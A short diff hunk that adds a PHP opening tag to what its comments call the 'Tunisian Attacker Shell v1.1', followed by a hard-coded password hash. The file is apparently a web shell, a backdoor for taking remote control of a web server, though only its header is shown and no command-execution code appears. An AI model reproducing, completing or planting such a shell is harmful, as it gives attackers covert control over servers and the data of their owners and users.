@@ -1,3 +1,4 @@
+<?php 
 /* Tunisian Attacker Shell v1.1 */
 /*      Maded by ßad Danger      */
 $auth_pass = "2cedad174d258b146946076b353b750f";
